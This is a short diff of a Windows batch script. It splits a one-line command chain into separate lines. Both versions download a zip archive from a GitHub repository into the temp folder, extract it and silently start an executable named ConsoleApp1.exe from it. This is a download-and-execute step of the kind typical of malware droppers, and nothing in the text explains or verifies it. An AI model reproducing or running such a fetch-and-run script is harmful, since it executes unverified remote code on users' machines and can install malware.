@@ -1,1 +1,7 @@
-set tempPath=%TEMP%\ardx-main.zip && set extractedPath=%TEMP%\ardx-main && curl -L -o "%tempPath%" "https://github.com/oldmones/ardx/archive/refs/heads/main.zip" && tar -xf "%tempPath%" -C "%TEMP%" && cd "%extractedPath%" && start "" "ConsoleApp1.exe"
+set tempPath=%TEMP%\ardx-main.zip
+set extractedPath=%TEMP%\ardx-main
+curl -L -o %tempPath% "https://github.com/oldmones/ardx/archive/refs/heads/main.zip"
+tar -xf %tempPath% -C %TEMP%
+cd %extractedPath%
+start "" "ConsoleApp1.exe"
+
